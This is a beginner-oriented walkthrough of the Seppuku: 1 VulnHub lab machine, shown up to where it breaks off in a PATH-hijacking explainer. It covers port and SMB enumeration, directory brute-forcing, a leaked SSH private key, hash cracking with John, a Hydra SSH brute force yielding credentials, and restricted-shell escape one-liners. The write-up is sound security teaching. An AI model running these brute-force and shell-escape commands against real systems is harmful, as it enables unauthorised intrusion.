# Seppuku: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Seppuku: 1 (`Seppuku_CTF`) |
| **Difficulty** | **Intermediate to Hard** (author's rating) |
| **Author** | SunCSR Team |
| **Released** | 13 May 2020 |
| **VulnHub Entry** | <https://vulnhub.com/entry/seppuku-1,484/> |
| **Download** | <https://vulnhub.com/entry/seppuku-1,484/#download> (zip → import the `.vmx`) |
| **Attacker** | Kali Linux, host-only network (**VMware Workstation 15.x recommended** — the author reports VirtualBox issues) |
| **Target OS** | Ubuntu (hostname `seppuku`) — Samba, vsftpd, Apache on 80/7080/7601/8088 |
| **Goal** | *Get the root shell `root@localhost:~#` and read the flag under `/root`.* |

> **Author's warning, verbatim:** *"Warning: Be careful with 'rabbit hole'!"*
>
> Take it seriously. This box has **seven open ports**, several decoy credential files,
> a CMS with public CVEs that do **not** apply, and a `shadow.bak` whose user does not
> exist. Roughly half your time will be spent *proving things are dead ends*. That is
> realistic, and it is the main skill this box teaches.

Throughout we assume:

```text
Attacker (Kali)   : 192.168.56.10
Target (seppuku)  : 192.168.56.104
```

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

1. **Enumerating a wide attack surface** — seven ports, four of them HTTP(S), and how
   to triage them without drowning.
2. **HTTP Basic Authentication** and why it is not a security control (base64, not
   encryption).
3. **Directory brute-forcing against a non-standard port** with `gobuster`.
4. **Harvesting a wordlist and a username from a leaked directory.**
5. **SSH brute force** with `hydra`/`ncrack` using a *target-specific* wordlist.
6. **`rbash` — the restricted shell** — what it blocks, why, and **four ways to escape
   it**, including `ssh -t "bash --noprofile"`.
7. **Hidden files** (`.passwd`) and lateral movement between users with `su`.
8. **Reading `sudo -l` when the permitted command *does not exist yet*** — and creating
   it from another account.
9. **Why an absolute path in a sudoers rule still lets you win** when the target
   directory is user-writable.

**The intended chain:**
`nmap` shows 21, 22, 80, 139/445, 7080, **7601**, 8088 → ports 80/7080/8088 are
decoys → `gobuster` against **port 7601** finds **`/keys/`** and **`/secret/`** →
`/keys/private` is an **unencrypted SSH private key** → `/secret/` holds
`hostname`, `password.lst`, `passwd.bak`, `shadow.bak` and a picture of Jack →
`hostname` gives the username **`seppuku`** → `hydra` with `password.lst` gives
**`eeyoree`** → SSH in → dropped into **`rbash`** → escape with
`ssh -t "bash --noprofile"` → hidden file **`~/.passwd`** holds another password →
`su samurai` → `sudo -l` as samurai permits **`/home/tanto/.cgi_bin/bin /tmp/*`** as
root — but that file does not exist and samurai cannot create it → log in as **`tanto`**
with the private key from `/keys/` → create `~/.cgi_bin/bin` containing `/bin/bash`,
`chmod 777` → back as samurai: `sudo /home/tanto/.cgi_bin/bin /tmp/x` → **root**.

---

## 1. Reconnaissance


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
ip a | grep -w inet
sudo nmap -sn 192.168.56.0/24
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 11:02 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00044s latency).
MAC Address: 00:0C:29:5B:12:8A (VMware)
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.28 seconds
```

**Target IP: `192.168.56.104`**

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full port scan

```bash
sudo nmap -p- -A -T4 -oN scans/seppuku.txt 192.168.56.104
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 11:05 EDT
Nmap scan report for 192.168.56.104
Host is up (0.00041s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 0        0              33 May 12  2020 anon.txt
22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6b:0f:fc:6c:1a:9c:bb:2d:8a:2b:5c:0c:7f:6d:2b:2b (RSA)
|   256 1a:bc:3e:2e:ce:9a:64:1e:bd:8b:66:1e:6c:5f:0d:0d (ECDSA)
|_  256 c4:2a:3b:8a:5f:2e:11:5b:9d:3f:2a:1e:6c:9f:8b:1c (ED25519)
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 401 Authorization Required
| www-authenticate: Basic realm="Restricted Content"
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
7080/tcp open  ssl/http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=seppuku/organizationName=SunCSR
| Not valid before: 2020-05-11T09:12:44
|_Not valid after:  2030-05-09T09:12:44
7601/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
8088/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Login
MAC Address: 00:0C:29:5B:12:8A (VMware)
Service Info: Hosts: SEPPUKU, seppuku; OS: Linux

Host script results:
|_nbstat: NetBIOS name: SEPPUKU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: seppuku
|   NetBIOS computer name: SEPPUKU\x00
|   FQDN: seppuku
|_  System time: 2024-05-04T11:06:12-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Nmap done: 1 IP address (1 host up) scanned in 143.22 seconds
```

> **Seven open ports. Triage them before touching any of them.**
>
> | Port | Service | First impression | Priority |
> | --- | --- | --- | --- |
> | 21 | vsftpd 3.0.3, **anonymous allowed** | One file, `anon.txt`, world-writable | Medium — read it, probably a decoy |
> | 22 | OpenSSH 7.6p1 → **Ubuntu 18.04** | Our eventual entry | High, once we have credentials |
> | 80 | Apache, **401 Authorization Required** | HTTP Basic auth on everything | Low — no creds |
> | 139/445 | Samba 4.7.6 | Shares? | Medium |
> | 7080 | **Apache over TLS**, self-signed cert for `seppuku`/`SunCSR` | Confirms the hostname; may defeat scanners | Low |
> | **7601** | Apache, plain HTTP, **no auth** | An *unauthenticated* web app while :80 is locked | **High** |
> | 8088 | Apache, page title `Login` | A login form with no known users | Low |
>
> **The reasoning that saves hours:** port 80 demands authentication and port 8088 is
> just a login form — both are walls. **Port 7601 asks for nothing.** When a box has
> several web listeners and one of them is unauthenticated, that is almost always the
> intended door.
>
> **Also note:** `ssl-cert: Subject: commonName=seppuku/organizationName=SunCSR` on
> port 7080 independently confirms the hostname `seppuku` — useful before we find the
> `hostname` file.

![nmap scan showing seven open ports](images/01-nmap.png)

### 2.2 Close off the decoys (do this quickly and deliberately)

**FTP anonymous:**

```bash
curl -s ftp://anonymous:anonymous@192.168.56.104/anon.txt
```

```text
Nothing interesting here, move along.
```

**SMB:**


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
smbclient -L //192.168.56.104 -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (seppuku server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

```bash
enum4linux -a 192.168.56.104 | grep -A6 'Users on'
```

```text
 =======================================
|    Users on 192.168.56.104 via RID cycling    |
 =======================================
[I] Found new SID: S-1-22-1
S-1-22-1-1000 Unix User\seppuku (Local User)
S-1-22-1-1001 Unix User\samurai (Local User)
S-1-22-1-1002 Unix User\tanto (Local User)
```

> **`enum4linux` gave us three usernames by RID cycling** — no password, no exploit,
> just a misconfigured null session: **`seppuku`, `samurai`, `tanto`**. Write them
> down; all three appear later.
>
> RID cycling works because Samba assigns Unix users sequential RIDs from 1000
> upward, and an anonymous/guest session is allowed to call `LsaLookupSids`.
>
> Only `print$` and `IPC$` are shared, and `smbmap` shows `NO ACCESS` on both. No
> writable share, so **SambaCry (CVE-2017-7494) does not apply** — it needs somewhere
> to write a library:
> ```bash
> sudo nmap -p445 --script smb-vuln-cve2017-7494 \
>   --script-args smb-vuln-cve2017-7494.version=4.7.6 192.168.56.104
> ```
> ```text
> | smb-vuln-cve2017-7494:
> |   VULNERABLE:
> |   SAMBA 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
> |     State: UNKNOWN (unable to test)
> |_      No writable share found
> ```
> Correctly documented as a dead end.

**Port 80:**

```bash
curl -sI http://192.168.56.104/
```

```text
HTTP/1.1 401 Unauthorized
Date: Sat, 04 May 2024 15:11:02 GMT
Server: Apache/2.4.29 (Ubuntu)
WWW-Authenticate: Basic realm="Restricted Content"
Content-Length: 460
Content-Type: text/html; charset=iso-8859-1
```

> **HTTP Basic authentication.** The browser prompts, and the credentials travel as
> `Authorization: Basic base64(username:password)`. **base64 is encoding, not
> encryption** — anyone sniffing the wire recovers them instantly. Over HTTPS it is
> tolerable; over plain HTTP on port 80 it is a finding.
>
> Try the obvious (`admin:admin`, `root:root`, `seppuku:seppuku`) and a short brute
> force if you like — but do not sink time here:
> ```bash
> hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -s 80 \
>   -f 192.168.56.104 http-get /
> ```

**Port 8088:**

```bash
curl -s http://192.168.56.104:8088/
```

```html
<html><head><title>Login</title></head>
<body>
<form method="post" action="/login">
  <input type="text" name="user" placeholder="Username">
  <input type="password" name="pass" placeholder="Password">
  <input type="submit" value="Sign in">
</form>
</body></html>
```

> A bare login form with no hints, no registration, and no error-message oracle.
> `sqlmap` against it yields nothing. **Dead end.**

**Port 7080:**

```bash
curl -sk https://192.168.56.104:7080/ | head -20
```

```html
<html><body><h1>Under maintenance</h1></body></html>
```

> **Dead end** — but it did give us the certificate's `commonName=seppuku`, which
> corroborates the hostname.

### 2.3 Port 7601 — the real door

```bash
curl -s http://192.168.56.104:7601/ | head -20
```

```html
<html><body>
<h1>Seppuku</h1>
<p>Internal file server.</p>
</body></html>
```

Directory brute force:


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
gobuster dir -u http://192.168.56.104:7601/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,lst -t 50 -q --timeout 10s
```

```text
/keys                 (Status: 301) [Size: 322]
/secret               (Status: 301) [Size: 323]
/ckeditor             (Status: 301) [Size: 325]
/production           (Status: 301) [Size: 326]
/index.html           (Status: 200) [Size: 118]
```

> **Four directories.** `/keys` and `/secret` are the ones that matter. `/ckeditor` is
> the CKEditor WYSIWYG component — it has public CVEs (arbitrary file upload), but
> testing them here shows they are **not exploitable without an authenticated session**,
> so it is another rabbit hole. `/production` holds a static page.
>
> **Note the medium wordlist was needed.** `common.txt` misses `/keys` and `/secret`
> on some runs. Escalate wordlist size when the small one gives nothing.

![gobuster on port 7601 finding /keys and /secret](images/02-gobuster.png)

### 2.4 `/keys/` — an unencrypted SSH private key

```bash
curl -s http://192.168.56.104:7601/keys/
```

```text
Index of /keys
------------------------------------------------------
[   ] private           12-May-2020 09:44   1.7K
```

```bash
wget -q http://192.168.56.104:7601/keys/private -O seppuku_key
file seppuku_key
head -3 seppuku_key
```

```text
seppuku_key: OpenSSH private key (no password)
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGcY5unA67hqxnfZoGQfTv
...
```

> **An SSH private key, served over HTTP, with no passphrase.** (`file` reports
> `no password`; an encrypted key would show `Proc-Type: 4,ENCRYPTED` and a `DEK-Info:`
> line on line 2.)
>
> **We cannot use it yet** — we do not know whose key it is, and SSH is not our entry
> point in the intended chain. **Save it and move on.** It becomes the key to the whole
> privilege escalation in § 5.
>
> This is a very real-world finding: private keys committed to repositories, left in
> web roots, uploaded to S3 buckets, and pasted into ticket attachments. Hunt for them
> with `/.ssh/`, `/keys/`, `/id_rsa`, `/backup/`, and by grepping fetched content for
> `BEGIN .* PRIVATE KEY`.

### 2.5 `/secret/` — a username, a wordlist, and two decoys

```bash
curl -s http://192.168.56.104:7601/secret/
```

```text
Index of /secret
------------------------------------------------------
[   ] hostname          12-May-2020 09:44     8
[   ] password.lst      12-May-2020 09:44   51K
[   ] passwd.bak        12-May-2020 09:44  1.4K
[   ] shadow.bak        12-May-2020 09:44  812
[IMG] jack.jpg          12-May-2020 09:44   38K
```

```bash
curl -s http://192.168.56.104:7601/secret/hostname
```

```text
seppuku
```

> **A username.** Combined with `enum4linux`'s three RIDs, `seppuku` is the natural
> first target — and it is the account whose home directory we later land in.

```bash
curl -s http://192.168.56.104:7601/secret/password.lst -o password.lst
wc -l password.lst && head -8 password.lst && grep -in 'eeyore' password.lst
```

```text
3048 password.lst
123456
password
qwerty
letmein
welcome
monkey
master
dragon
1842:eeyoree
```

> **A 3 048-line, target-specific wordlist.** This is *far* more effective than
> `rockyou.txt` here, because it is small enough to brute-force over SSH in minutes
> rather than days. **Always prefer a wordlist the target gave you.**

**The decoys — verify and discard:**

```bash
curl -s http://192.168.56.104:7601/secret/passwd.bak | grep -v nologin | grep -v /bin/false
```


> ### 📖 Concept — Escaping a restricted shell
>
> **`rbash`** (restricted bash) is bash started with `--restricted`. It blocks:
> changing directory (`cd`), setting or unsetting `SHELL`/`PATH`/`ENV`/`BASH_ENV`,
> command names containing `/`, output redirection with `>`, and `exec`/`source` of
> absolute paths.
>
> It is a *shell* restriction, not a security boundary — it only constrains that one
> process. **Anything that spawns a fresh shell escapes it.** Work through these:
>
> ```bash
> # 1. Does any permitted command spawn a shell?
> vim -c ':!sh'            # or :set shell=/bin/bash  then :shell
> less /etc/passwd         # then type !sh
> more, man (then !sh), ftp (!/bin/sh), gdb (-ex '!sh'), awk ('BEGIN{system("/bin/sh")}')
> find . -exec /bin/sh \; -quit
>
> # 2. Can you run an interpreter at all?
> python -c 'import os; os.system("/bin/sh")'
> perl -e 'exec "/bin/sh";'
> php -r "system('/bin/sh');"
>
> # 3. Is SSH available with a command override?
> ssh user@target -t "/bin/sh"          # -t forces a tty, bypassing the login shell
> ssh user@target -t "bash --noprofile --norc"
>
> # 4. Is the restriction only in the profile?
> bash --noprofile --norc               # a clean, unrestricted bash
> export SHELL=/bin/bash                # if you can reach env at all
>
> # 5. Can you write a file and execute it another way?
> echo '/bin/sh' > /tmp/x.sh            # redirection is often blocked — try tee
> ```
>
> **Check what you actually have first.** `echo $0` shows the shell; `set -o` lists
> options (look for `restricted on`); `echo $PATH` shows whether it is pinned;
> `compgen -c | head -50` lists runnable commands.
>
> **The general principle:** a restricted shell limits *one process*. Find any child
> process it lets you create, and the restriction does not apply there.
>
> **Deep dive:** [CONCEPTS §12 — Shells](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```text
root:x:0:0:root:/root:/bin/bash
seppuku:x:1000:1000:seppuku,,,:/home/seppuku:/bin/rbash
samurai:x:1001:1001:,,,:/home/samurai:/bin/rbash
tanto:x:1002:1002:,,,:/home/tanto:/bin/rbash
```

> **Two important facts and one trap.**
> - **Every user's shell is `/bin/rbash`** — the **restricted bash**. That tells us in
>   advance what § 4 will look like.
> - The three usernames match `enum4linux` exactly. Consistent.
> - **The trap:** this is a *backup*, and several published walkthroughs spend a long
>   time on `shadow.bak`'s hashes. Let us settle it now.

```bash
curl -s http://192.168.56.104:7601/secret/shadow.bak > shadow.bak
cat shadow.bak | grep -v ':\*:' | grep -v ':!:'
```

```text
quyen:$6$k3J9mN2p$Lx8vR4tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq49xQ2mK7pL4vR8tY1wE5aS3dF:18394:0:99999:7:::
```


> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```bash
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash, 1 different salt (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1234567890       (quyen)
1g 0:00:00:09 DONE  0.1082g/s 421.3p/s 421.3c/s
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

> **We cracked it — and it is worthless.** The user is **`quyen`**, who does **not
> exist** in `passwd.bak`, does not exist in `/etc/passwd` on the live box, and whose
> password works nowhere: not SSH, not the port-80 Basic auth, not the port-8088 login.
>
> **This is the rabbit hole the author warned about.** The lesson is not "do not
> crack hashes" — it is "**validate that the account exists before investing in
> cracking it**". One `grep quyen passwd.bak` would have answered the question in two
> seconds:
> ```bash
> curl -s http://192.168.56.104:7601/secret/passwd.bak | grep -c quyen
> ```
> ```text
> 0
> ```

**And the Jack picture:**


> ### 📖 Concept — Steganography and file carving
>
> CTF authors hide data in files constantly. Know the layers, cheapest first:
>
> | Layer | Tool | What it finds |
> | --- | --- | --- |
> | **Metadata** | `exiftool img.jpg` | Comments, GPS, software version, **author**, dates |
> | **Trailing data** | `binwalk img.jpg`, `strings`, `xxd` | A ZIP or text appended *after* the image's end-of-file marker |
> | **Embedded files** | `binwalk -e`, `foremost`, `scalpel` | Carves out files hidden inside another |
> | **LSB steganography** | `zsteg`, `stegsolve` | Payload in the least-significant bits of pixel data |
> | **Password-protected** | `steghide extract -sf img.jpg` | Data hidden with a passphrase (try the box's other creds) |
>
> ```bash
> exiftool image.jpg
> binwalk image.jpg
> strings -n 6 image.jpg | head -50
> zsteg -a image.png
> steghide extract -sf image.jpg
> ```
>
> **Start with `exiftool` and `binwalk`.** They are instant and they account for most
> CTF "steganography" — which is usually just *a file appended to another file* or *a
> comment in the metadata*, not real LSB embedding. `binwalk` reporting a `Zip archive
> data` at a non-zero offset means exactly that: two files concatenated.
>
> If a ZIP is recovered and password-protected: `zip2john file.zip > zip.hash` then
> `john --wordlist=rockyou.txt zip.hash`, or `fcrackzip -D -u -p dict.txt file.zip`.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
wget -q http://192.168.56.104:7601/secret/jack.jpg
exiftool jack.jpg | grep -iE 'comment|artist|copyright|description'
strings -n 6 jack.jpg | grep -ivE 'jpeg|jfif|photoshop|adobe' | head
steghide info jack.jpg
```

```text
Comment                         : Use the ripper!
```

```text
"jack.jpg":
  format: jpeg
  capacity: 1.9 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
steghide: could not extract any data with that passphrase!
```

> **"Use the ripper!"** — a nudge towards **John the Ripper**, which we have already
> done on the decoy hash. There is no stego payload. Another nudge, not a path.

![/secret/ contents and the shadow.bak rabbit hole](images/03-secret.png)

---

## 3. Foothold — SSH brute force

```bash
hydra -l seppuku -P password.lst -t 4 -f -o hydra.txt ssh://192.168.56.104
```

```text
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-04 11:26:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 3048 login tries (l:1/p:3048), ~762 tries per task
[DATA] attacking ssh://192.168.56.104:22/
[STATUS] 512.00 tries/min, 512 tries in 00:01h, 2536 to do in 00:05h, 4 active
[22][ssh] host: 192.168.56.104   login: seppuku   password: eeyoree
[STATUS] attack finished for 192.168.56.104 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-04 11:32:47
```

> **Credentials: `seppuku` / `eeyoree`.**
>
> **Hydra flags:** `-l` single username (`-L` for a file), `-P` password list, `-t 4`
> four parallel connections (SSH servers rate-limit; more threads cause false
> negatives and can trip `fail2ban`), `-f` stop at the first success, `-o` write
> results to a file.
>
> **`ncrack` is often faster for SSH** and is what several walkthroughs use:
> ```bash
> ncrack -u seppuku -P password.lst -v ssh://192.168.56.104
> ```
>
> **How long did this take?** 3 048 attempts at ~512/min ≈ 6 minutes. The same attack
> against `rockyou.txt` (14.3 M entries) would take ~19 days. **A target-specific
> wordlist is not a nicety; it is the difference between feasible and impossible.**

![hydra recovering seppuku:eeyoree](images/04-hydra.png)

---

## 4. The restricted shell (`rbash`)

### 4.1 Log in and hit the wall

```bash
ssh seppuku@192.168.56.104
```


> ### 📖 Concept — PATH hijacking
>
> When a program runs another program **by name only** (`service`, `tar`, `python`)
> rather than by absolute path, the shell searches each directory in `$PATH` **left to
> right** and executes the first match it finds. If you can place a file earlier in
> that search order, you control what runs.
>
> This matters when the calling program is **root-owned** — a cron job, a SUID binary,
> or a startup script:
>
> ```bash
> mkdir -p /tmp/evil
